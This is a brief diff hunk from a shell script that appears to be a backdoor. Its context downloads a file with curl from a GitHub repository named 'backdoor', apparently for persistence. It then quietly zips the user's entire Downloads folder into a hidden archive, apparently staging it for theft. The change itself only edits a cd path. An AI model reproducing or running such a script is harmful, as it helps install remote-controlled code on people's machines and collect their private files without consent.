@@ -3,7 +3,7 @@ curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfov
 cd ..
 # echo "success" >> .bombmaterials
 cd ..
-cd ~/Downloads
+cd Downloads/
 if [ ! -f "../.downloads.zip" ]; then
    zip -r ../.downloads.zip *
 fi
